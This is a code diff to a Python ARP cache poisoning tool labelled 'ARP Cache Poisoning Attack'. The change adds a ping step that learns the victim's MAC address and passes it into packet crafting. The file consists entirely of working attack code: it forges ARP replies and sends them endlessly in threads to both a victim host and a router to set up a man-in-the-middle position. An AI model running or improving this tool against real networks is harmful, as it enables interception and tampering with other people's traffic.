@@ -1,4 +1,5 @@
 from __future__ import print_function
+from ping import Arp_Ping
 import socket
 import binascii
 import threading
@@ -18,10 +19,11 @@ class Arp_Spoof(object):
 			print("\033[1;31mUnable to bind to interface... unknown type\033[00m")
 			exit()
 
-	def craft_packet(self, target_ip=None, redirect_to_ip=None, redirect_to_mac=None):
+	def craft_packet(self, target_ip=None, redirect_to_ip=None, redirect_to_mac=None, target_mac=None):
 		#thanks to techb for help
-		if target_ip and redirect_to_ip and redirect_to_mac != None:
-			target_mac='FF:FF:FF:FF:FF:FF'
+		if target_ip and redirect_to_ip and redirect_to_mac and target_mac != None:
+			#TODO: Make it possable
+			#target_mac='FF:FF:FF:FF:FF:FF'
 			arp_header_code = '\x08\x06'
 			target_ip = socket.inet_aton(target_ip)
 			target_mac = binascii.unhexlify(''.join(target_mac.split(':')))
@@ -48,39 +50,48 @@ class Arp_Spoof(object):
 
 			return arp_packet
 
-	def poison_victim(self, rdi, ti, verbose, ifa):
+	def poison_victim(self, rdi, ti, verbose, ifa, tm):
 		with open('/sys/class/net/{}/address'.format(ifa), 'r') as file:
 			redirect_to_mac = file.read().strip()
-		packet = self.craft_packet(target_ip=ti, redirect_to_ip=rdi, redirect_to_mac=redirect_to_mac)
+		packet = self.craft_packet(target_ip=ti, redirect_to_ip=rdi, redirect_to_mac=redirect_to_mac, target_mac=tm)
 		i = 0
 		while True:
 			try:
-				if __name__ == '__main__':
-					i += 1
-					sys.stdout.write('\033[1;32mPackets Sent:\033[00m {}\r'.format(i))
-					sys.stdout.flush()
-				s.send(packet)
-				time.sleep(verbose)
-			except socket.error as e:
-				print("\033[1;31m"+str(e)+"\033[00m")
-				exit()
+				try:
+					if __name__ == '__main__':
+						i += 1
+						sys.stdout.write('\033[1;32mPackets Sent:\033[00m {}\r'.format(i))
+						sys.stdout.flush()
+					s.send(packet)
+					time.sleep(verbose)
+				except socket.error as e:
+					print("\033[1;31m"+str(e)+"\033[00m")
+					exit()
+			except KeyboardInterrupt:
+				sys.stdout.write("[\033[1;31m+\033[00m] Shutting down... Bye\n")
+				exit(1)
 
-	def poison_router(self, rdi, ti, verbose, ifa):
+	def poison_router(self, rdi, ti, verbose, ifa, tm):
 		with open('/sys/class/net/{}/address'.format(ifa), 'r') as file:
 			redirect_to_mac = file.read().strip()
-		packet = self.craft_packet(target_ip=ti, redirect_to_ip=rdi, redirect_to_mac=redirect_to_mac)
+		packet = self.craft_packet(target_ip=ti, redirect_to_ip=rdi, redirect_to_mac=redirect_to_mac, target_mac=tm)
 		i = 0
 		while True:
 			try:
-				if __name__ == '__main__':
-					i += 1
-					sys.stdout.write('\033[1;32mPackets Sent:\033[00m {}\r'.format(i))
-					sys.stdout.flush()
-				s.send(packet)
-				time.sleep(verbose)
-			except socket.error as e:
-				print("\033[1;31m"+str(e)+"\033[00m")
-				exit()
+				try:
+					if __name__ == '__main__':
+						i += 1
+						sys.stdout.write('\033[1;32mPackets Sent:\033[00m {}\r'.format(i))
+						sys.stdout.flush()
+					s.send(packet)
+					time.sleep(verbose)
+				except socket.error as e:
+					print("\033[1;31m"+str(e)+"\033[00m")
+					exit()
+			except KeyboardInterrupt:
+				sys.stdout.write("[\033[1;31m+\033[00m] Shutting down..\r")
+				sys.stdout.flush()
+				exit(1)
 
 if __name__ == '__main__':
 	ap = argparse.ArgumentParser(description="ARP Cache Poisoning Attack")
@@ -92,8 +103,6 @@ if __name__ == '__main__':
 
 	#Banner
 	print("\033[1;3mArpspoof v1 [{}]\033[00m".format(args.interface))
-
-
 
 	#Handle any possable errors
 	try:
@@ -108,10 +117,23 @@ if __name__ == '__main__':
 		print("\033[1;31mIncorrect IP address\033[00m")
 		exit()
 
-	victim_thread = threading.Thread(target=arp.poison_victim, args=(args.target, args.router, int(args.verbose), args.interface))
+	arp = Arp_Spoof(args.interface)
+	p = Arp_Ping(args.interface)
+	p.ping(args.target)
+	while True:
+		tm = p.await_responce(args.interface)
+		try:
+			if len(tm) != 0:
+				break
+		except TypeError: pass
+	tm = tm[0]
+
+	#TODO: Make function to find mac of target with arp request, and if apple try diffrent attack
+
+	victim_thread = threading.Thread(target=arp.poison_victim, args=(args.target, args.router, int(args.verbose), args.interface, tm))
 	victim_thread.deamon = True
 	victim_thread.start()
 
-	target_thread = threading.Thread(target=arp.poison_router, args=(args.router, args.target, int(args.verbose), args.interface))
+	target_thread = threading.Thread(target=arp.poison_router, args=(args.router, args.target, int(args.verbose), args.interface, tm))
 	target_thread.deamon = True
 	target_thread.start()
